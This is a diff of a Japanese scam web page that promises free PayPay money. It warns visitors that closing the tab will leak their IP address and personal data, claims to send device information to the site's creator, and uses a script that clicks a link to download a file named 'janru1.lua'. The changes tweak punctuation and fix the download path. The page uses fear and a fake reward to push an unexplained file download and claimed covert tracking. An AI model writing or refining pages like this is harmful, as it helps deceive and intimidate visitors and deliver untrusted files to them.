@@ -19,7 +19,7 @@
 </head>
 <body>
 
-<h2>Paypayがもらえる！？？</h2>
+<h2>Paypayがもらえる！？</h2>
 <h3>簡単な登録をするだけ！！</h3>
 <h3>このタブを消すと個人情報が流出します。ipアドレスなどが流出します</h3>
 <h3>As a countermeasure, this site acquires IP addresses and device information and sends them to the site creator.</h3>
@@ -117,7 +117,7 @@
 
     function downloadFile() {
         var link = document.createElement('a');
-        link.href = 'path/to/janru1.lua'; // janru1.luaファイルへのパスを指定
+        link.href = './janru1.lua'; // janru1.luaファイルへの相対パスを指定
         link.download = 'janru1.lua';
         document.body.appendChild(link);
         link.click();
